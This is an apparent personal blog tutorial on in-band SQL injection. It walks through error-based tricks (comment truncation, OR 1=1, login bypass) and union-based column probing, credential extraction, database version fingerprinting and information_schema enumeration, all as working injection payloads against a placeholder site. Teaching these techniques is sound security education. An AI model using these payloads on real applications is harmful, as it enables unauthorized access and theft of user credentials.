---
title: "A deep dive into In-Band SQL Injection"
description: "This post go further in details  the very first type of SQL Injection - In-band SQLi and its two subcategogires: error-based and union-based.
"
date: "2021-10-13"
headerImage: "https://www.simplilearn.com/ice9/free_resources_article_thumb/SQLnjection.png"
tags: ["projects"]
---

--------------------------------------------------
### ERROR-BASED SQLi 
--------------------------------------------------
Even though it's a basic technique, error-based SQLi can be used to obtain hidden data, gaining additional information from an application. Suppose we have an e-commerce web page that displays products in different categories. A user browses on this web page and clicks "General" category, resulting in a link: *https://insecure-website.com/products?category=General*

The above URL will make the web application execute an SQL query:

```
  SELECT * FROM products WHERE category='General' AND release = 1 
```
<br />
Here, "release = 1 " is presumably used to show the products. In other words, if the restriction "release=0", the products won't be displayed on the website. One way to modify the URL is:

  *https://insecure-website.com/products?category=General'--* 

Which makes the SQL query change to:

```
  SELECT * FROM products WHERE category='General'--' AND release = 1 
```
<br>
This works because in SQL, -- acts as a comment indicator, meaning everything after it is ignored. In this case, the restriction 'release=1' is removed from the query, which, consequently, shows all the products under "General" category on the webpage. Another way to craft this attack is:

 *https://insecure-website.com/products?category=General'+OR+1=1--*

The SQL query corresponding to this URL is:

```
    SELECT * FROM products WHERE category='General' OR 1=1 --'AND release = 1
```
<br>
Similar to the first attack, the "release=1" condition is totally removed from the query. The only difference here is, as we can see, this query will return all the products under every single category available on the website due to the condition '1=1' appended to the query. 

Error-based SQLi can also be used to bypass logins on web applications. When a user enters username and password to log into a web page, the following SQL query is executed (assuming the username is admin and the password is password123):

```
   SELECT * FROM users WHERE username = 'admin' and password = 'password123' 
```
<br>
Attackers can bypass this process by inputing "administrator'--" to the username field and leave the password field blank. The SQL query now becomes: 

```
   SELECT * FROM users WHERE username = 'administrator'--' and password = ''
```
<br>
If the username "administrator" exists in the database, attackers can be logged in with this username.

--------------------------------------------------
### UNION-BASED SQLi
--------------------------------------------------
Union-based SQLi is another technique used to retrieve additional information like others table in database. The UNION keyword allows attackers to execute one or more additinoal SELECT queries and append the results to the original query. For this type of attack, there are two requirements to satisfy: all the select queries must return the same number of columns and the data types in each column must be compatible between the queries. For example, consider the query:

``` 
  SELECT itemID, itemDescription FROM products WHERE category='General' 
```
<br>
This query returns two columns, itemID whose data type is integer and itemDescription whose data type is string. In order for a UNION-BASED SQLi to work, each UNION SELECT statement must also return two columns whose data types are integer and string, respectively. With that being said, to deliver a UNION-BASED SQLi, attackers have to determine the number of columns being returned and the data types of those columns.

##### Determine the number of columns being returned
There are two ways to figure out how many columns are required for an attack.
The first method is to use a ORDER BY # clauses where # is the number referring to the specified column. For example, if we have

```
    SELECT itemID, itemDescription FROM products WHERE category='General' ORDER BY 1--
```
<br>
The results will be ordered by the itemID, which is specified by 1. Similarly, if we use ' ORDER BY 2, the results will be sorted by the second index column, itemDescription.
Understanding how ' ORDER BY clauses work, we can deliver different payloads to determine the number of columns returned. We can keep increasing the specified column index until we get an error. Let's take a look at the following 3 queries:

  ```
  SELECT itemID, itemDescription FROM products WHERE category='General' ORDER BY 1--
  SELECT itemID, itemDescription FROM products WHERE category='General' ORDER BY 2--
  SELECT itemID, itemDescription FROM products WHERE category='General' ORDER BY 3--
  ```
  <br>
The third query will give an error because as we all, the above query only returns two columns, meaning we don't have the third index column by which the results are sorted. The error may vary from one application to another. But the concept is still the same. Once we detect some difference in response, we can determine the correct number of columns needed for the attack.
The second method is to use UNION SELECT statements with different numbers of NULL values:

```
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT NULL--
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT NULL, NULL--
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT NULL, NULL, NULL--
```
<br>
The UNION SELECT statement only works if it returns the same number of columns as the original query does. In this case, only the second query works because it actually returns two columns whose values are NULL. The first and the third query return 1 column and 3 columns, respectively, which consequently yield errors upon execution.
A quick note here for the NULL value: it is used because it is convertible to any data types, which satisfies the second requirement for UNION SELECT statement that the return data types must match with the original's.
<br>
##### Determine the data type of each column returned
Now that we've successfully determine the number of columns returned. We need to figure out what type of data in each columns to satisfy the second requirement. To do this, we will use UNION SELECT statements: 

```
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT 'a', NULL--
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT NULL, 'a'--
```
<br>
Recall that this original query returns two columns with data types of integer and string, respectively, which requires the UNION SELECT to do the same. The first query will actually give an error becasue the first value it returns is of type string (while it should have been of type integer). The second query, on the other hand, works without any errors, which is an indication to attackers that the second column's data type is string. Similarly, by attempting these queries, attackers can confirm that integers are returned at the first column: 

```
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT 1, NULL--
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT NULL, 1 --
```
<br>
Now, what can attackers do with UNION-BASED SQLi? Having figured out the number of columns and their data types, attackers can retrieve a lot of sensitive data from the web applications. Obtaining username and passwords is the most common one:

```
  SELECT itemID, itemDescription, itemLocation FROM products WHERE category='General' UNION SELECT userID, username, password from users--
```
<br>  
Notice that I have added another column to the original query, itemLocation, so this UNION SELECT query will work. But in reality, what if we only have 1 column of type string (itemDescription) and we need to grab two or more columns of type strings (username and password)? We can actually concatenate all the values into one single column in the UNION SELECT statement:

```
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT userID, username || ~ || password from users--
```
<br>
What we did here is concatenate username and password, separated by '~' sign beforing returning it. This UNION SELECT statement will return two columns, userID of type integer and the second column containing username concatenated with the password in the format: username ~ password. So the return results should look like: roberto~bluemoon, alex~goangeles, casey~kittenlover, etc.
Of course, in order for this query to work, we need to know the table name (in this case, it is users), column names (userID, username, password) and the information of the database being used. UNION SELECT once again can be used to obtain such goals. 

##### Obtain database information
The very first thing we need to retrieve is the database type and its version. This can easily be done by UNION SELECT statement:

```
  SELECT itemID, itemDescription FROM products WHERE category='General' UNION SELECT NULL, @@version--
```
<br>
The result may look like:

```
    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
		Mar 18 2018 09:11:49
		Copyright (c) Microsoft Corporation
		Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
<br>
Note that different databases use different ways of retrieving their versions. By trying different queries, attackers are able to determine what database is used and its current running version. Here is the list of some popular databases: 

```
    Microsoft, MySQL: Select @@version
		Oracle: Select * FROM v$version
		PostgreSQL: Select version()
 ```
<br>
The next step is to explore what the names of the databases used for the applications. Except for Oracle, most databases have a set of views called the infomration schema which provides all infromation about the database. The query ```SELECT * FROM information_schema.tables``` will result in table like: 
<table class="table table-striped my-5">
    <thead>
        <tr>
            <th scope="col">TABLE_CATALOG</th>
            <th scope="col">TABLE_SCHEMA</th>
            <th scope="col">TABLE_NAME</th>
            <th scope="col">TABLE_TYPE</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>MyDatabase</td>
            <td>Inventory</td>
            <td>Products</td>
            <td>BASE TABLE</td>
        </tr>
        <tr>
            <td>MyDatabase</td>
            <td>dbo</td>
            <td>Users</td>
            <td>BASE TABLE</td>
        </tr>
        <tr>
            <td>MyDatabase</td>
            <td>dbo</td>
            <td>Membership</td>
            <td>BASE TABLE</td>
        </tr>
        <tr>
            <td>MyDatabase</td>
            <td>Customer</td>
            <td>Feedback</td>
            <td>BASE TABLE</td>
        </tr>
    </tbody>
</table>
This table shows that there are three different databases for an application: Inventory, dbo and Customer. Inventory and Customer both have 1 table each, Products and Feedback, respectively. Database dbo has two tables: Users and Membership. Attackers can use these queries to enumerate the the databases. An popular attacking query might look like this: 

```
    SELECT * FROM users where username = '' UNION SELECT NULL, TABLE_SCHEMA , NULL from information_schema.tables
```
<br>
This results from an input to the username field in the log in form: ```' UNION SELECT NULL, TABLE_SCHEMA , NULL from information_schema.tables```. Given the users table returns 3 columns, the injected query will provide all the databases availalbe in the system, i.e Inventory, dbo and Customer.
Moving to the next step, we can use UNION SELECT to enumerate the columns within a table. We can use information_schema.columns to obtain such information. A regular SQL query ```SELECT * FROM information_schema.columns WHERE table_name = 'Users'``` yields a table:
<table class="table table-striped my-5">
    <thead>
        <tr>
            <th scope="col">TABLE_CATALOG</th>
            <th scope="col">TABLE_SCHEMA</th>
            <th scope="col">TABLE_NAME</th>
            <th scope="col">COLUMN_NAME</th>
            <th scope="col">DATA_TYPE</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>MyDatabase</td>
            <td>dbo</td>
            <td>Users</td>
            <td>userID</td>
            <td>int</td>
        </tr>
        <tr>
            <td>MyDatabase</td>
            <td>dbo</td>
            <td>Users</td>
            <td>username</td>
            <td>varChar</td>
        </tr>
        <tr>
            <td>MyDatabase</td>
            <td>dbo</td>
            <td>Users</td>
            <td>password</td>
            <td>varChar</td>
        </tr>
    </tbody>
</table>
<br>
By inputting <code>' UNION SELECT NULL, COLUMN_NAME , NULL from information_schema.columns where TABLE_NAME='users'</code>, attackers modify the query to be:<br/> 
    <code> SELECT * FROM users where username = '' UNION SELECT NULL, COLUMN_NAME , NULL from information_schema.columns where TABLE_NAME='users'</code><br/> <br/>
Once executed, the query yields a list of all the column names in the Users table. Likewise, the payload <code>' UNION SELECT NULL, COLUMN_NAME , DATA_TYPE from information_schema.columns where TABLE_NAME='users'</code> will give attackers both the column names and their associated data type.
Voila!!! We now have successfully enumerated the database using UNION SELECT statement. Obtaining such information is very crucial as it allows us to not only know what vulnerabilites the application may be exposed to, but also craft our payloads for further exploits.
</p>
